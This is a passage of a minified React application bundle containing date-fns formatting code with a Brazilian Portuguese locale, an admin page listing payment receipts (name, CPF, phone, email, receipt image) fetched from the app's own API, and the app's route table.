          return n.dayPeriod(s, {
            width: "abbreviated",
            context: "formatting"
          });
        case "aaa":
          return n.dayPeriod(s, {
            width: "abbreviated",
            context: "formatting"
          }).toLowerCase();
        case "aaaaa":
          return n.dayPeriod(s, {
            width: "narrow",
            context: "formatting"
          });
        case "aaaa":
        default:
          return n.dayPeriod(s, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    b: function (e, t, n) {
      const r = e.getHours();
      let s;
      switch (r === 12 ? s = us.noon : r === 0 ? s = us.midnight : s = r / 12 >= 1 ? "pm" : "am",
      t) {
        case "b":
        case "bb":
          return n.dayPeriod(s, {
            width: "abbreviated",
            context: "formatting"
          });
        case "bbb":
          return n.dayPeriod(s, {
            width: "abbreviated",
            context: "formatting"
          }).toLowerCase();
        case "bbbbb":
          return n.dayPeriod(s, {
            width: "narrow",
            context: "formatting"
          });
        case "bbbb":
        default:
          return n.dayPeriod(s, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    B: function (e, t, n) {
      const r = e.getHours();
      let s;
      switch (r >= 17 ? s = us.evening : r >= 12 ? s = us.afternoon : r >= 4 ? s = us.morning : s = us.night,
      t) {
        case "B":
        case "BB":
        case "BBB":
          return n.dayPeriod(s, {
            width: "abbreviated",
            context: "formatting"
          });
        case "BBBBB":
          return n.dayPeriod(s, {
            width: "narrow",
            context: "formatting"
          });
        case "BBBB":
        default:
          return n.dayPeriod(s, {
            width: "wide",
            context: "formatting"
          })
      }
    },
    h: function (e, t, n) {
      if (t === "ho") {
        let r = e.getHours() % 12;
        return r === 0 && (r = 12),
          n.ordinalNumber(r, {
            unit: "hour"
          })
      }
      return Kn.h(e, t)
    },
    H: function (e, t, n) {
      return t === "Ho" ? n.ordinalNumber(e.getHours(), {
        unit: "hour"
      }) : Kn.H(e, t)
    },
    K: function (e, t, n) {
      const r = e.getHours() % 12;
      return t === "Ko" ? n.ordinalNumber(r, {
        unit: "hour"
      }) : le(r, t.length)
    },
    k: function (e, t, n) {
      let r = e.getHours();
      return r === 0 && (r = 24),
        t === "ko" ? n.ordinalNumber(r, {
          unit: "hour"
        }) : le(r, t.length)
    },
    m: function (e, t, n) {
      return t === "mo" ? n.ordinalNumber(e.getMinutes(), {
        unit: "minute"
      }) : Kn.m(e, t)
    },
    s: function (e, t, n) {
      return t === "so" ? n.ordinalNumber(e.getSeconds(), {
        unit: "second"
      }) : Kn.s(e, t)
    },
    S: function (e, t) {
      return Kn.S(e, t)
    },
    X: function (e, t, n) {
      const r = e.getTimezoneOffset();
      if (r === 0)
        return "Z";
      switch (t) {
        case "X":
          return n0(r);
        case "XXXX":
        case "XX":
          return Ir(r);
        case "XXXXX":
        case "XXX":
        default:
          return Ir(r, ":")
      }
    },
    x: function (e, t, n) {
      const r = e.getTimezoneOffset();
      switch (t) {
        case "x":
          return n0(r);
        case "xxxx":
        case "xx":
          return Ir(r);
        case "xxxxx":
        case "xxx":
        default:
          return Ir(r, ":")
      }
    },
    O: function (e, t, n) {
      const r = e.getTimezoneOffset();
      switch (t) {
        case "O":
        case "OO":
        case "OOO":
          return "GMT" + t0(r, ":");
        case "OOOO":
        default:
          return "GMT" + Ir(r, ":")
      }
    },
    z: function (e, t, n) {
      const r = e.getTimezoneOffset();
      switch (t) {
        case "z":
        case "zz":
        case "zzz":
          return "GMT" + t0(r, ":");
        case "zzzz":
        default:
          return "GMT" + Ir(r, ":")
      }
    },
    t: function (e, t, n) {
      const r = Math.trunc(e.getTime() / 1e3);
      return le(r, t.length)
    },
    T: function (e, t, n) {
      const r = e.getTime();
      return le(r, t.length)
    }
  };
function t0(e, t = "") {
  const n = e > 0 ? "-" : "+"
    , r = Math.abs(e)
    , s = Math.trunc(r / 60)
    , o = r % 60;
  return o === 0 ? n + String(s) : n + String(s) + t + le(o, 2)
}
function n0(e, t) {
  return e % 60 === 0 ? (e > 0 ? "-" : "+") + le(Math.abs(e) / 60, 2) : Ir(e, t)
}
function Ir(e, t = "") {
  const n = e > 0 ? "-" : "+"
    , r = Math.abs(e)
    , s = le(Math.trunc(r / 60), 2)
    , o = le(r % 60, 2);
  return n + s + t + o
}
const r0 = (e, t) => {
  switch (e) {
    case "P":
      return t.date({
        width: "short"
      });
    case "PP":
      return t.date({
        width: "medium"
      });
    case "PPP":
      return t.date({
        width: "long"
      });
    case "PPPP":
    default:
      return t.date({
        width: "full"
      })
  }
}
  , _w = (e, t) => {
    switch (e) {
      case "p":
        return t.time({
          width: "short"
        });
      case "pp":
        return t.time({
          width: "medium"
        });
      case "ppp":
        return t.time({
          width: "long"
        });
      case "pppp":
      default:
        return t.time({
          width: "full"
        })
    }
  }
  , Ok = (e, t) => {
    const n = e.match(/(P+)(p+)?/) || []
      , r = n[1]
      , s = n[2];
    if (!s)
      return r0(e, t);
    let o;
    switch (r) {
      case "P":
        o = t.dateTime({
          width: "short"
        });
        break;
      case "PP":
        o = t.dateTime({
          width: "medium"
        });
        break;
      case "PPP":
        o = t.dateTime({
          width: "long"
        });
        break;
      case "PPPP":
      default:
        o = t.dateTime({
          width: "full"
        });
        break
    }
    return o.replace("{{date}}", r0(r, t)).replace("{{time}}", _w(s, t))
  }
  , Ik = {
    p: _w,
    P: Ok
  }
  , _k = /^D+$/
  , Lk = /^Y+$/
  , Fk = ["D", "DD", "YY", "YYYY"];
function Vk(e) {
  return _k.test(e)
}
function Bk(e) {
  return Lk.test(e)
}
function zk(e, t, n) {
  const r = Uk(e, t, n);
  if (console.warn(r),
    Fk.includes(e))
    throw new RangeError(r)
}
function Uk(e, t, n) {
  const r = e[0] === "Y" ? "years" : "days of the month";
  return `Use \`${e.toLowerCase()}\` instead of \`${e}\` (in \`${t}\`) for formatting ${r} to the input \`${n}\`; see: https://github.com/date-fns/date-fns/blob/master/docs/unicodeTokens.md`
}
const $k = /[yYQqMLwIdDecihHKkms]o|(\w)\1*|''|'(''|[^'])+('|$)|./g
  , Hk = /P+p+|P+|p+|''|'(''|[^'])+('|$)|./g
  , Wk = /^'([^]*?)'?$/
  , Qk = /''/g
  , qk = /[a-zA-Z]/;
function Gk(e, t, n) {
  var d, f, h, y, b, v, C, g;
  const r = lc()
    , s = (n == null ? void 0 : n.locale) ?? r.locale ?? Tk
    , o = (n == null ? void 0 : n.firstWeekContainsDate) ?? ((f = (d = n == null ? void 0 : n.locale) == null ? void 0 : d.options) == null ? void 0 : f.firstWeekContainsDate) ?? r.firstWeekContainsDate ?? ((y = (h = r.locale) == null ? void 0 : h.options) == null ? void 0 : y.firstWeekContainsDate) ?? 1
    , i = (n == null ? void 0 : n.weekStartsOn) ?? ((v = (b = n == null ? void 0 : n.locale) == null ? void 0 : b.options) == null ? void 0 : v.weekStartsOn) ?? r.weekStartsOn ?? ((g = (C = r.locale) == null ? void 0 : C.options) == null ? void 0 : g.weekStartsOn) ?? 0
    , l = tn(e);
  if (!YT(l))
    throw new RangeError("Invalid time value");
  let c = t.match(Hk).map(m => {
    const p = m[0];
    if (p === "p" || p === "P") {
      const w = Ik[p];
      return w(m, s.formatLong)
    }
    return m
  }
  ).join("").match($k).map(m => {
    if (m === "''")
      return {
        isToken: !1,
        value: "'"
      };
    const p = m[0];
    if (p === "'")
      return {
        isToken: !1,
        value: Kk(m)
      };
    if (e0[p])
      return {
        isToken: !0,
        value: m
      };
    if (p.match(qk))
      throw new RangeError("Format string contains an unescaped latin alphabet character `" + p + "`");
    return {
      isToken: !1,
      value: m
    }
  }
  );
  s.localize.preprocessor && (c = s.localize.preprocessor(l, c));
  const u = {
    firstWeekContainsDate: o,
    weekStartsOn: i,
    locale: s
  };
  return c.map(m => {
    if (!m.isToken)
      return m.value;
    const p = m.value;
    (!(n != null && n.useAdditionalWeekYearTokens) && Bk(p) || !(n != null && n.useAdditionalDayOfYearTokens) && Vk(p)) && zk(p, t, String(e));
    const w = e0[p[0]];
    return w(l, p, s.localize, u)
  }
  ).join("")
}
function Kk(e) {
  const t = e.match(Wk);
  return t ? t[1].replace(Qk, "'") : e
}
const Yk = {
  lessThanXSeconds: {
    one: "menos de um segundo",
    other: "menos de {{count}} segundos"
  },
  xSeconds: {
    one: "1 segundo",
    other: "{{count}} segundos"
  },
  halfAMinute: "meio minuto",
  lessThanXMinutes: {
    one: "menos de um minuto",
    other: "menos de {{count}} minutos"
  },
  xMinutes: {
    one: "1 minuto",
    other: "{{count}} minutos"
  },
  aboutXHours: {
    one: "cerca de 1 hora",
    other: "cerca de {{count}} horas"
  },
  xHours: {
    one: "1 hora",
    other: "{{count}} horas"
  },
  xDays: {
    one: "1 dia",
    other: "{{count}} dias"
  },
  aboutXWeeks: {
    one: "cerca de 1 semana",
    other: "cerca de {{count}} semanas"
  },
  xWeeks: {
    one: "1 semana",
    other: "{{count}} semanas"
  },
  aboutXMonths: {
    one: "cerca de 1 mês",
    other: "cerca de {{count}} meses"
  },
  xMonths: {
    one: "1 mês",
    other: "{{count}} meses"
  },
  aboutXYears: {
    one: "cerca de 1 ano",
    other: "cerca de {{count}} anos"
  },
  xYears: {
    one: "1 ano",
    other: "{{count}} anos"
  },
  overXYears: {
    one: "mais de 1 ano",
    other: "mais de {{count}} anos"
  },
  almostXYears: {
    one: "quase 1 ano",
    other: "quase {{count}} anos"
  }
}
  , Xk = (e, t, n) => {
    let r;
    const s = Yk[e];
    return typeof s == "string" ? r = s : t === 1 ? r = s.one : r = s.other.replace("{{count}}", String(t)),
      n != null && n.addSuffix ? n.comparison && n.comparison > 0 ? "em " + r : "há " + r : r
  }
  , Jk = {
    full: "EEEE, d 'de' MMMM 'de' y",
    long: "d 'de' MMMM 'de' y",
    medium: "d MMM y",
    short: "dd/MM/yyyy"
  }
  , Zk = {
    full: "HH:mm:ss zzzz",
    long: "HH:mm:ss z",
    medium: "HH:mm:ss",
    short: "HH:mm"
  }
  , e5 = {
    full: "{{date}} 'às' {{time}}",
    long: "{{date}} 'às' {{time}}",
    medium: "{{date}}, {{time}}",
    short: "{{date}}, {{time}}"
  }
  , t5 = {
    date: Is({
      formats: Jk,
      defaultWidth: "full"
    }),
    time: Is({
      formats: Zk,
      defaultWidth: "full"
    }),
    dateTime: Is({
      formats: e5,
      defaultWidth: "full"
    })
  }
  , n5 = {
    lastWeek: e => {
      const t = e.getDay();
      return "'" + (t === 0 || t === 6 ? "último" : "última") + "' eeee 'às' p"
    }
    ,
    yesterday: "'ontem às' p",
    today: "'hoje às' p",
    tomorrow: "'amanhã às' p",
    nextWeek: "eeee 'às' p",
    other: "P"
  }
  , r5 = (e, t, n, r) => {
    const s = n5[e];
    return typeof s == "function" ? s(t) : s
  }
  , s5 = {
    narrow: ["AC", "DC"],
    abbreviated: ["AC", "DC"],
    wide: ["antes de cristo", "depois de cristo"]
  }
  , o5 = {
    narrow: ["1", "2", "3", "4"],
    abbreviated: ["T1", "T2", "T3", "T4"],
    wide: ["1º trimestre", "2º trimestre", "3º trimestre", "4º trimestre"]
  }
  , i5 = {
    narrow: ["j", "f", "m", "a", "m", "j", "j", "a", "s", "o", "n", "d"],
    abbreviated: ["jan", "fev", "mar", "abr", "mai", "jun", "jul", "ago", "set", "out", "nov", "dez"],
    wide: ["janeiro", "fevereiro", "março", "abril", "maio", "junho", "julho", "agosto", "setembro", "outubro", "novembro", "dezembro"]
  }
  , a5 = {
    narrow: ["D", "S", "T", "Q", "Q", "S", "S"],
    short: ["dom", "seg", "ter", "qua", "qui", "sex", "sab"],
    abbreviated: ["domingo", "segunda", "terça", "quarta", "quinta", "sexta", "sábado"],
    wide: ["domingo", "segunda-feira", "terça-feira", "quarta-feira", "quinta-feira", "sexta-feira", "sábado"]
  }
  , l5 = {
    narrow: {
      am: "a",
      pm: "p",
      midnight: "mn",
      noon: "md",
      morning: "manhã",
      afternoon: "tarde",
      evening: "tarde",
      night: "noite"
    },
    abbreviated: {
      am: "AM",
      pm: "PM",
      midnight: "meia-noite",
      noon: "meio-dia",
      morning: "manhã",
      afternoon: "tarde",
      evening: "tarde",
      night: "noite"
    },
    wide: {
      am: "a.m.",
      pm: "p.m.",
      midnight: "meia-noite",
      noon: "meio-dia",
      morning: "manhã",
      afternoon: "tarde",
      evening: "tarde",
      night: "noite"
    }
  }
  , c5 = {
    narrow: {
      am: "a",
      pm: "p",
      midnight: "mn",
      noon: "md",
      morning: "da manhã",
      afternoon: "da tarde",
      evening: "da tarde",
      night: "da noite"
    },
    abbreviated: {
      am: "AM",
      pm: "PM",
      midnight: "meia-noite",
      noon: "meio-dia",
      morning: "da manhã",
      afternoon: "da tarde",
      evening: "da tarde",
      night: "da noite"
    },
    wide: {
      am: "a.m.",
      pm: "p.m.",
      midnight: "meia-noite",
      noon: "meio-dia",
      morning: "da manhã",
      afternoon: "da tarde",
      evening: "da tarde",
      night: "da noite"
    }
  }
  , u5 = (e, t) => {
    const n = Number(e);
    return (t == null ? void 0 : t.unit) === "week" ? n + "ª" : n + "º"
  }
  , d5 = {
    ordinalNumber: u5,
    era: un({
      values: s5,
      defaultWidth: "wide"
    }),
    quarter: un({
      values: o5,
      defaultWidth: "wide",
      argumentCallback: e => e - 1
    }),
    month: un({
      values: i5,
      defaultWidth: "wide"
    }),
    day: un({
      values: a5,
      defaultWidth: "wide"
    }),
    dayPeriod: un({
      values: l5,
      defaultWidth: "wide",
      formattingValues: c5,
      defaultFormattingWidth: "wide"
    })
  }
  , f5 = /^(\d+)[ºªo]?/i
  , h5 = /\d+/i
  , m5 = {
    narrow: /^(ac|dc|a|d)/i,
    abbreviated: /^(a\.?\s?c\.?|d\.?\s?c\.?)/i,
    wide: /^(antes de cristo|depois de cristo)/i
  }
  , p5 = {
    any: [/^ac/i, /^dc/i],
    wide: [/^antes de cristo/i, /^depois de cristo/i]
  }
  , g5 = {
    narrow: /^[1234]/i,
    abbreviated: /^T[1234]/i,
    wide: /^[1234](º)? trimestre/i
  }
  , y5 = {
    any: [/1/i, /2/i, /3/i, /4/i]
  }
  , v5 = {
    narrow: /^[jfmajsond]/i,
    abbreviated: /^(jan|fev|mar|abr|mai|jun|jul|ago|set|out|nov|dez)/i,
    wide: /^(janeiro|fevereiro|março|abril|maio|junho|julho|agosto|setembro|outubro|novembro|dezembro)/i
  }
  , x5 = {
    narrow: [/^j/i, /^f/i, /^m/i, /^a/i, /^m/i, /^j/i, /^j/i, /^a/i, /^s/i, /^o/i, /^n/i, /^d/i],
    any: [/^ja/i, /^fev/i, /^mar/i, /^abr/i, /^mai/i, /^jun/i, /^jul/i, /^ago/i, /^set/i, /^out/i, /^nov/i, /^dez/i]
  }
  , w5 = {
    narrow: /^(dom|[23456]ª?|s[aá]b)/i,
    short: /^(dom|[23456]ª?|s[aá]b)/i,
    abbreviated: /^(dom|seg|ter|qua|qui|sex|s[aá]b)/i,
    wide: /^(domingo|(segunda|ter[cç]a|quarta|quinta|sexta)([- ]feira)?|s[aá]bado)/i
  }
  , b5 = {
    short: [/^d/i, /^2/i, /^3/i, /^4/i, /^5/i, /^6/i, /^s[aá]/i],
    narrow: [/^d/i, /^2/i, /^3/i, /^4/i, /^5/i, /^6/i, /^s[aá]/i],
    any: [/^d/i, /^seg/i, /^t/i, /^qua/i, /^qui/i, /^sex/i, /^s[aá]b/i]
  }
  , S5 = {
    narrow: /^(a|p|mn|md|(da) (manhã|tarde|noite))/i,
    any: /^([ap]\.?\s?m\.?|meia[-\s]noite|meio[-\s]dia|(da) (manhã|tarde|noite))/i
  }
  , C5 = {
    any: {
      am: /^a/i,
      pm: /^p/i,
      midnight: /^mn|^meia[-\s]noite/i,
      noon: /^md|^meio[-\s]dia/i,
      morning: /manhã/i,
      afternoon: /tarde/i,
      evening: /tarde/i,
      night: /noite/i
    }
  }
  , N5 = {
    ordinalNumber: Ow({
      matchPattern: f5,
      parsePattern: h5,
      valueCallback: e => parseInt(e, 10)
    }),
    era: dn({
      matchPatterns: m5,
      defaultMatchWidth: "wide",
      parsePatterns: p5,
      defaultParseWidth: "any"
    }),
    quarter: dn({
      matchPatterns: g5,
      defaultMatchWidth: "wide",
      parsePatterns: y5,
      defaultParseWidth: "any",
      valueCallback: e => e + 1
    }),
    month: dn({
      matchPatterns: v5,
      defaultMatchWidth: "wide",
      parsePatterns: x5,
      defaultParseWidth: "any"
    }),
    day: dn({
      matchPatterns: w5,
      defaultMatchWidth: "wide",
      parsePatterns: b5,
      defaultParseWidth: "any"
    }),
    dayPeriod: dn({
      matchPatterns: S5,
      defaultMatchWidth: "any",
      parsePatterns: C5,
      defaultParseWidth: "any"
    })
  }
  , j5 = {
    code: "pt-BR",
    formatDistance: Xk,
    formatLong: t5,
    formatRelative: r5,
    localize: d5,
    match: N5,
    options: {
      weekStartsOn: 0,
      firstWeekContainsDate: 1
    }
  };
function P5() {
  const [e, t] = x.useState([])
    , [n, r] = x.useState(!0)
    , [s, o] = x.useState(null)
    , [i, l] = x.useState(!1)
    , c = async () => {
      r(!0);
      try {
        const h = await (await fetch("/api/comprovantes")).json();
        h.success && t(h.comprovantes)
      } catch (f) {
        console.error("Erro ao carregar comprovantes:", f)
      }
      r(!1)
    }
    ;
  x.useEffect(() => {
    c()
  }
    , []);
  const u = async f => {
    l(!0);
    try {
      const y = await (await fetch(`/api/comprovante/${f}`)).json();
      y.success && y.comprovante && o(y.comprovante.imageBase64)
    } catch (h) {
      console.error("Erro ao carregar imagem:", h)
    }
    l(!1)
  }
    , d = f => f ? f.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "";
  return a.jsxs("div", {
    className: "min-h-screen bg-gray-100 p-4",
    children: [a.jsx("div", {
      className: "max-w-6xl mx-auto",
      children: a.jsxs("div", {
        className: "bg-white rounded-lg shadow-lg p-6",
        children: [a.jsxs("div", {
          className: "flex items-center justify-between mb-6",
          children: [a.jsx("h1", {
            className: "text-2xl font-bold text-gray-800",
            children: "Comprovantes de Pagamento"
          }), a.jsxs("button", {
            onClick: c,
            className: "flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700",
            children: [a.jsx(aN, {
              className: "w-4 h-4"
            }), "Atualizar"]
          })]
        }), n ? a.jsxs("div", {
          className: "text-center py-8",
          children: [a.jsx("div", {
            className: "animate-spin w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full mx-auto"
          }), a.jsx("p", {
            className: "mt-2 text-gray-600",
            children: "Carregando..."
          })]
        }) : e.length === 0 ? a.jsx("div", {
          className: "text-center py-8 text-gray-500",
          children: "Nenhum comprovante encontrado"
        }) : a.jsx("div", {
          className: "overflow-x-auto",
          children: a.jsxs("table", {
            className: "w-full",
            children: [a.jsx("thead", {
              children: a.jsxs("tr", {
                className: "bg-gray-50",
                children: [a.jsx("th", {
                  className: "px-4 py-3 text-left text-sm font-semibold text-gray-600",
                  children: "Data"
                }), a.jsx("th", {
                  className: "px-4 py-3 text-left text-sm font-semibold text-gray-600",
                  children: "Nome"
                }), a.jsx("th", {
                  className: "px-4 py-3 text-left text-sm font-semibold text-gray-600",
                  children: "CPF"
                }), a.jsx("th", {
                  className: "px-4 py-3 text-left text-sm font-semibold text-gray-600",
                  children: "Telefone"
                }), a.jsx("th", {
                  className: "px-4 py-3 text-left text-sm font-semibold text-gray-600",
                  children: "Email"
                }), a.jsx("th", {
                  className: "px-4 py-3 text-left text-sm font-semibold text-gray-600",
                  children: "Arquivo"
                }), a.jsx("th", {
                  className: "px-4 py-3 text-center text-sm font-semibold text-gray-600",
                  children: "Ações"
                })]
              })
            }), a.jsx("tbody", {
              children: e.map(f => a.jsxs("tr", {
                className: "border-b hover:bg-gray-50",
                children: [a.jsx("td", {
                  className: "px-4 py-3 text-sm text-gray-700",
                  children: f.createdAt ? Gk(new Date(f.createdAt), "dd/MM/yyyy HH:mm", {
                    locale: j5
                  }) : "-"
                }), a.jsx("td", {
                  className: "px-4 py-3 text-sm text-gray-700 font-medium",
                  children: f.nome
                }), a.jsx("td", {
                  className: "px-4 py-3 text-sm text-gray-700",
                  children: d(f.cpf)
                }), a.jsx("td", {
                  className: "px-4 py-3 text-sm text-gray-700",
                  children: f.phone || "-"
                }), a.jsx("td", {
                  className: "px-4 py-3 text-sm text-gray-700",
                  children: f.email || "-"
                }), a.jsx("td", {
                  className: "px-4 py-3 text-sm text-gray-700",
                  children: f.imageName
                }), a.jsx("td", {
                  className: "px-4 py-3 text-center",
                  children: a.jsxs("button", {
                    onClick: () => u(f.id),
                    className: "inline-flex items-center gap-1 px-3 py-1 bg-green-600 text-white rounded hover:bg-green-700 text-sm",
                    children: [a.jsx(sN, {
                      className: "w-4 h-4"
                    }), "Ver"]
                  })
                })]
              }, f.id))
            })]
          })
        })]
      })
    }), (s || i) && a.jsx("div", {
      className: "fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4",
      children: a.jsxs("div", {
        className: "bg-white rounded-lg max-w-4xl w-full max-h-[90vh] overflow-auto",
        children: [a.jsxs("div", {
          className: "flex items-center justify-between p-4 border-b",
          children: [a.jsx("h2", {
            className: "text-lg font-semibold",
            children: "Comprovante"
          }), a.jsx("button", {
            onClick: () => o(null),
            className: "p-1 hover:bg-gray-100 rounded",
            children: a.jsx(cx, {
              className: "w-6 h-6"
            })
          })]
        }), a.jsx("div", {
          className: "p-4",
          children: i ? a.jsx("div", {
            className: "text-center py-8",
            children: a.jsx("div", {
              className: "animate-spin w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full mx-auto"
            })
          }) : s ? a.jsx("img", {
            src: s,
            alt: "Comprovante",
            className: "max-w-full h-auto mx-auto"
          }) : null
        })]
      })
    })]
  })
}
function A5() {
  return a.jsx(jT, {
    children: a.jsxs(wj, {
      children: [a.jsx(vt, {
        path: "/",
        component: HT
      }), a.jsx(vt, {
        path: "/login",
        component: Wj
      }), a.jsx(vt, {
        path: "/verificacao",
        component: Kj
      }), a.jsx(vt, {
        path: "/saiba-mais",
        component: aT
      }), a.jsx(vt, {
        path: "/success",
        component: kp
      }), a.jsx(vt, {
        path: "/sucess",
        component: kp
      }), a.jsx(vt, {
        path: "/verify-availability",
        component: cT
      }), a.jsx(vt, {
        path: "/pagamento",
        component: uT
      }), a.jsx(vt, {
        path: "/pix-payment",
        component: dT
      }), a.jsx(vt, {
        path: "/cadastro-concluido",
        component: mT
      }), a.jsx(vt, {
        path: "/chat",
        component: gT
      }), a.jsx(vt, {
        path: "/comprovantes",
        component: P5
      }), a.jsx(vt, {
        path: "/:cpf",
        component: vT
      })]
    })
  })
}
jv(document.getElementById("root")).render(a.jsx(x.StrictMode, {
  children: a.jsxs(XS, {
    client: JS,
    children: [a.jsx(A5, {}), a.jsx(WN, {})]
  })
}));
